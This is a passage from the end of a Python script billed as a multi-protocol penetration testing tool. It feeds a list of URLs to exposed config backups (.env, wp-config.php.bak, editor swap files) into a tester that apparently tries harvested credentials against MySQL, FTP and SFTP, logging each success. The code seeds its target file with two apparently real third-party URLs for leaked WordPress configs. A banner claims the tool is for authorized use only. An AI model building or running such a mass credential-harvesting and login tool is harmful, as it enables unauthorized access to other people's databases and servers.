        except FileNotFoundError:
            logger.error(f"File {file_path} not found")
        except Exception as e:
            logger.error(f"Error processing file {file_path}: {e}")

def get_protocol_selection():
    """Interactive protocol selection menu"""
    print("\n" + "="*60)
    print("           PROTOCOL SELECTION MENU")
    print("="*60)
    print("Select which protocols to test:")
    print("1. MySQL only")
    print("2. FTP only") 
    print("3. SFTP only")
    print("4. MySQL + FTP")
    print("5. MySQL + SFTP")
    print("6. FTP + SFTP")
    print("7. All protocols (MySQL + FTP + SFTP)")
    print("8. Custom selection")
    print("="*60)
    
    try:
        choice = input("Enter your choice (1-8): ").strip()
        
        if choice == '1':
            return ['mysql']
        elif choice == '2':
            return ['ftp']
        elif choice == '3':
            return ['sftp']
        elif choice == '4':
            return ['mysql', 'ftp']
        elif choice == '5':
            return ['mysql', 'sftp']
        elif choice == '6':
            return ['ftp', 'sftp']
        elif choice == '7':
            return ['mysql', 'ftp', 'sftp']
        elif choice == '8':
            # Custom selection
            protocols = []
            print("\nCustom Protocol Selection:")
            
            mysql = input("Test MySQL? (y/n): ").lower().startswith('y')
            if mysql:
                protocols.append('mysql')
                
            ftp = input("Test FTP? (y/n): ").lower().startswith('y')
            if ftp:
                protocols.append('ftp')
                
            sftp = input("Test SFTP? (y/n): ").lower().startswith('y')
            if sftp:
                protocols.append('sftp')
            
            if not protocols:
                print("No protocols selected! Defaulting to MySQL only.")
                return ['mysql']
            
            return protocols
        else:
            print("Invalid choice! Defaulting to all protocols.")
            return ['mysql', 'ftp', 'sftp']
            
    except (ValueError, KeyboardInterrupt):
        print("\nDefaulting to all protocols.")
        return ['mysql', 'ftp', 'sftp']

def get_retry_configuration():
    """Get retry configuration from user"""
    print("\n" + "="*60)
    print("           RETRY CONFIGURATION")
    print("="*60)
    print("Configure retry settings for failed connections:")
    
    try:
        max_retries = int(input("Maximum retry attempts per operation (default 3): ") or "3")
        if max_retries < 0 or max_retries > 10:
            print("Invalid retry count, using default: 3")
            max_retries = 3
        
        print(f"✅ Retry configuration: {max_retries} attempts per operation")
        return max_retries
        
    except ValueError:
        print("Invalid input, using default: 3 retries")
        return 3

def main():
    """Main function"""
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║     Enhanced Multi-Protocol Penetration Testing Tool v3.0    ║
    ║    🔄 Retry Logic + 🚫 Duplicate Prevention + 📊 Analytics    ║
    ║                                                               ║
    ║  Protocols: MySQL, FTP, SFTP (Selectable)                   ║
    ║  Formats: .swp, .json, .env, .ini, .conf, .xml, .php, ~     ║
    ║  Features: Sequential testing, Retry with backoff, Dedup     ║
    ║                                                               ║
    ║  🆕 NEW FEATURES:                                             ║
    ║  • Exponential backoff retry mechanism                       ║
    ║  • Duplicate result prevention with hashing                  ║
    ║  • Sequential protocol testing per URL                       ║
    ║  • Enhanced statistics and success rate tracking             ║
    ║                                                               ║
    ║  WARNING: This tool is for authorized security testing only!  ║
    ║  Only use on systems you own or have explicit permission to  ║
    ║  test. Unauthorized access to computer systems is illegal.   ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    # Protocol selection
    selected_protocols = get_protocol_selection()
    
    # Retry configuration
    max_retries = get_retry_configuration()
    
    print(f"\n✅ Selected protocols: {', '.join(selected_protocols).upper()}")
    print(f"✅ Retry configuration: {max_retries} attempts per operation")
    
    # Get user preferences
    try:
        max_workers = int(input("\nEnter max workers for URL processing (default 50): ") or "50")
        timeout = int(input("Enter timeout in seconds (default 10): ") or "10")
    except ValueError:
        max_workers = 50
        timeout = 10
    
    print(f"\n📋 Enhanced Configuration Summary:")
    print(f"   Protocols: {', '.join(selected_protocols).upper()}")
    print(f"   Max Workers: {max_workers}")
    print(f"   Timeout: {timeout} seconds")
    print(f"   Max Retries: {max_retries}")
    print(f"   Testing Mode: Sequential per URL")
    print(f"   Duplicate Prevention: Enabled")
    
    # Performance estimation
    protocol_count = len(selected_protocols)
    testing_mode = "Sequential (reliable)"
    print(f"   Testing Strategy: {testing_mode}")
    print(f"   Active Protocols: {protocol_count}/3")
    
    # Check if urls.txt exists
    urls_file = 'urls.txt'
    if not os.path.exists(urls_file):
        print(f"\n📝 Creating example {urls_file} file...")
        with open(urls_file, 'w') as f:
            f.write("https://3rag.com/poc/wp-config.php.bak\n")
            f.write("http://51vps.sqb360.vip/wp-config.php~\n")
            f.write("# Add more URLs here, one per line\n")
            f.write("# Supported formats: .swp, .json, .env, .ini, .conf, .xml, .php, .gif, .swf, ~\n")
            f.write("# Example: https://example.com/config.json\n")
            f.write("# Example: https://example.com/.env\n")
            f.write("# Example: https://example.com/wp-config.php.bak\n")
        print(f"Please add your target URLs to {urls_file} and run the script again.")
        return
    
    # Initialize enhanced tester
    tester = MultiProtocolPenTester(
        max_workers=max_workers, 
        timeout=timeout, 
        protocols=selected_protocols,
        max_retries=max_retries
    )
    
    print(f"\n🚀 Starting enhanced parallel processing with sequential protocol testing...")
    
    # Show output files for selected protocols
    output_info = []
    if 'mysql' in selected_protocols:
        output_info.append("mysql_results.txt (MySQL successes)")
    if 'ftp' in selected_protocols:
        output_info.append("ftp_results.txt (FTP successes)")
    if 'sftp' in selected_protocols:
        output_info.append("sftp_results.txt (SFTP successes)")
    
    print(f"📁 Output files will be created:")
    for info in output_info:
        print(f"   - {info}")
    print(f"   - pentest.log (Detailed logs with retry info)")
    
    print(f"\n🔄 Retry Policy:")
    print(f"   - Maximum {max_retries} attempts per connection")
    print(f"   - Exponential backoff (1s, 2s, 4s, 8s, 10s max)")
    print(f"   - Automatic retry on network timeouts")
    
    print(f"\n🚫 Duplicate Prevention:")
    print(f"   - Hash-based result deduplication")
    print(f"   - Prevents multiple identical outputs")
    print(f"   - Statistics tracking for prevented duplicates")
    
    # Process URLs
    tester.process_urls_from_file(urls_file)

if __name__ == "__main__":
    main()
